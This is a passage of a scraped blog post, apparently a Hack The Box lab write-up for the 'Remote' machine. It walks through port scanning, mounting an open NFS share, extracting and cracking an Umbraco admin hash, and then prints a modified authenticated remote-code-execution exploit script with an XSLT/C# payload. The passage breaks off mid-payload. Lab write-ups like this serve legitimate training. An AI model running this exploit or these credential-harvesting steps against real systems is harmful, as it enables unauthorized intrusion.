baceXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/remote-htb/","@type":"BlogPosting","headline":"Hack The Box - Remote","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2020-09-06T14:23:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Remote | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Remote</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Remote</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Sep 6, 2020, 2:23 PM +0800" > Sep 6, 2020 <i class="unloaded">2020-09-06T14:23:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2332 words">12 min</span></div></div><div class="post-content"><p>From this write-up, I probably learnt that it is best to get the screenshots and command outputs immediately or while you pwn the box as your exploits may not work in the future. However, it did teach me not to blindly rely on the online scripts to work perfectly everytime and I learnt how to fix them :)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/remote.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.180 remote.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> remote.htb
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-03-22 05:30 EDT
+Nmap scan report <span class="k">for </span>remote.htb <span class="o">(</span>10.10.10.180<span class="o">)</span>
+Host is up <span class="o">(</span>0.27s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 992 closed ports
+PORT     STATE    SERVICE       VERSION
+21/tcp   open     ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp   open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Home - Acme Widgets
+111/tcp  open     rpcbind       2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp  open     msrpc         Microsoft Windows RPC
+139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open     microsoft-ds?
+1119/tcp filtered bnetgame
+2049/tcp open     mountd        1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 2m12s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2020-03-22T09:34:15
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>268.43 seconds
+
+</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><p>Even though Anonymous FTP login was allowed, there was no files on the <code class="language-plaintext highlighter-rouge">ftp</code> service on port <code class="language-plaintext highlighter-rouge">21</code> :( Moving on, we see a <code class="language-plaintext highlighter-rouge">http</code> service running port <code class="language-plaintext highlighter-rouge">80</code> so lets check that out.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/remote1.png" alt="" /></p><p>This website seems like its based on a web template but let’s continue crawling around…</p><p><code class="language-plaintext highlighter-rouge">http://remote.htb/contact/</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/remote2.png" alt="" /></p><p>On this page was this button that brings me to a login page of a content management system (CMS) called <code class="language-plaintext highlighter-rouge">Umbraco</code>!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/remote3.png" alt="" /></p><p>We don’t have credentials to login with but I did find an <a href="https://github.com/noraj/Umbraco-RCE">exploit</a> we can possibly use on this CMS. However, this exploit require us to be authenticated but we can keep this exploit for later on.</p><p>Going back to the scan results, we see a large chuck of <code class="language-plaintext highlighter-rouge">rpcbind</code> information from port <code class="language-plaintext highlighter-rouge">111</code>, but below that we see a <code class="language-plaintext highlighter-rouge">mountd</code> service running on port <code class="language-plaintext highlighter-rouge">2049</code></p><p>Using <code class="language-plaintext highlighter-rouge">showmount</code>, we can see what <code class="language-plaintext highlighter-rouge">NFS</code> (Network File Share) shares are available on the service.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>showmount <span class="nt">-e</span> remote.htb
+Export list <span class="k">for </span>remote.htb:
+/site_backups <span class="o">(</span>everyone<span class="o">)</span>
+</pre></table></code></div></div><p>Lets try mounting it on our machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir</span> /mnt/nfs
+<span class="nv">$ </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>3 remote.htb:/site_backups /mnt/nfs
+</pre></table></code></div></div><p>No output but I guess it worked? Lets see whats inside!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /mnt/nfs
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
+total 123
+drwx------ 2 4294967294 4294967294  4096 Aug 15 11:12 <span class="nb">.</span>
+drwxr-xr-x 3 root       root        4096 Aug 16 15:15 ..
+drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 App_Browsers
+drwx------ 2 4294967294 4294967294  4096 Feb 20 12:17 App_Data
+drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 App_Plugins
+drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 aspnet_client
+drwx------ 2 4294967294 4294967294 49152 Feb 20 12:16 bin
+drwx------ 2 4294967294 4294967294  8192 Feb 20 12:16 Config
+drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 css
+<span class="nt">-rwx------</span> 1 4294967294 4294967294   152 Nov  1  2018 default.aspx
+<span class="nt">-rwx------</span> 1 4294967294 4294967294    89 Nov  1  2018 Global.asax
+drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Media
+drwx------ 2 4294967294 4294967294    64 Feb 20 12:16 scripts
+drwx------ 2 4294967294 4294967294  8192 Feb 20 12:16 Umbraco
+drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Umbraco_Client
+drwx------ 2 4294967294 4294967294  4096 Feb 20 12:16 Views
+<span class="nt">-rwx------</span> 1 4294967294 4294967294 28539 Feb 20 00:57 Web.config
+</pre></table></code></div></div><p>This seem like a folder containing the contents of the <code class="language-plaintext highlighter-rouge">Umbraco</code> CMS. Since this files and folders could be a backup of the current <code class="language-plaintext highlighter-rouge">Umbraco</code> instance that is running, lets see if we can find any hard-coded configuration or credentials we can use.</p><p>Digging around, I found a <code class="language-plaintext highlighter-rouge">Umbraco.sdf</code> under <code class="language-plaintext highlighter-rouge">App_Data</code>. Searching online, it says that this file was an <code class="language-plaintext highlighter-rouge">SQL</code> file containing the contents of the <code class="language-plaintext highlighter-rouge">Umbraco</code> CMS! Nice! However, this file is in binary but we can run <code class="language-plaintext highlighter-rouge">strings</code> on it and eyeball for information.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings Umbraco.sdf | less
+...
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="o">{</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"SHA1"</span><span class="o">}</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="o">{</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"SHA1"</span><span class="o">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="o">{</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"SHA1"</span><span class="o">}</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span class="o">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span class="o">={</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"HMACSHA256"</span><span class="o">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span class="o">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span class="o">={</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"HMACSHA256"</span><span class="o">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg<span class="o">==</span><span class="nv">RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA</span><span class="o">={</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"HMACSHA256"</span><span class="o">}</span>ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+...
+</pre></table></code></div></div><p>Alright, we see what seems to be login information such as the username, email, password hashes as well as the hash algorithm used. We can see 2 users: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">ssmith</code>, but hash of <code class="language-plaintext highlighter-rouge">admin@htb.local</code> is in <code class="language-plaintext highlighter-rouge">SHA1</code> while the hash of <code class="language-plaintext highlighter-rouge">ssmith@htb.local</code> is in <code class="language-plaintext highlighter-rouge">HMACSHA256</code>. <code class="language-plaintext highlighter-rouge">HMACSHA256</code> needs a key to be cracked but we are not sure how it was implemented in this system but we can definitely crack the <code class="language-plaintext highlighter-rouge">SHA1</code> hash online.</p><p><code class="language-plaintext highlighter-rouge">https://crackstation.net/</code>:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/remote4.png" alt="" /></p><p>Lets check if <code class="language-plaintext highlighter-rouge">baconandcheese</code> is still being used for the <code class="language-plaintext highlighter-rouge">admin@htb.local</code> account.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/remote5.png" alt="" /></p><p>After pressing “Login”, nothing appeared on webpage but we know that the login was successful. Remember the <a href="https://github.com/noraj/Umbraco-RCE">exploit</a> we found just now? Lets see if this exploit works with our credentials that we found.</p><h1 id="exploitation">Exploitation</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>python umbraco.py <span class="nt">-u</span> <span class="s1">'admin@htb.local'</span> <span class="nt">-p</span> <span class="s1">'baconandcheese'</span> <span class="nt">-i</span> http://remote.htb <span class="nt">-c</span> cmd.exe <span class="nt">-a</span> <span class="s2">"/c whoami"</span>
+k <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">"umbraco3.py"</span>, line 53, <span class="k">in</span> &lt;module&gt;
+    VIEWSTATE <span class="o">=</span> soup.find<span class="o">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">"__VIEWSTATE"</span><span class="o">)[</span><span class="s1">'value'</span><span class="o">]</span>
+</pre></table></code></div></div><p>When I first pwned this box, this exploit was working fine! Fortunately, I was able to debug and realised that the new cookies set after successful logon were not being saved properly, so I tweaked the script a little:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+</pre><td class="rouge-code"><pre><span class="c1"># Exploit Title: Umbraco CMS - Authenticated Remote Code Execution 
+# Date: 2020-03-28
+# Exploit Author: Alexandre ZANNI (noraj)
+# Based on: https://www.exploit-db.com/exploits/46153
+# Vendor Homepage: http://www.umbraco.com/
+# Software Link: https://our.umbraco.com/download/releases
+# Version: 7.12.4
+# Category: Webapps
+# Tested on: Windows IIS
+# Example: python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">from</span> <span class="nn">http.cookies</span> <span class="kn">import</span> <span class="n">SimpleCookie</span>
+
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">'exploit.py'</span><span class="p">,</span>
+    <span class="n">description</span><span class="o">=</span><span class="s">'Umbraco authenticated RCE'</span><span class="p">,</span>
+    <span class="n">formatter_class</span><span class="o">=</span><span class="k">lambda</span> <span class="n">prog</span><span class="p">:</span> <span class="n">argparse</span><span class="p">.</span><span class="n">HelpFormatter</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span><span class="n">max_help_position</span><span class="o">=</span><span class="mi">80</span><span class="p">))</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-u'</span><span class="p">,</span> <span class="s">'--user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'USER'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+    <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'user'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'username / email'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--password'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'PASS'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span>
+    <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">'password'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'password'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-i'</span><span class="p">,</span> <span class="s">'--host'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'URL'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+    <span class="n">dest</span><span class="o">=</span><span class="s">'url'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'root URL'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--command'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'CMD'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+    <span class="n">dest</span><span class="o">=</span><span class="s">'command'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'command'</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-a'</span><span class="p">,</span> <span class="s">'--arguments'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'ARGS'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
+    <span class="n">dest</span><span class="o">=</span><span class="s">'arguments'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'arguments'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="c1"># Payload
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"""</span><span class="se">\
+</span><span class="s">&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  &lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;
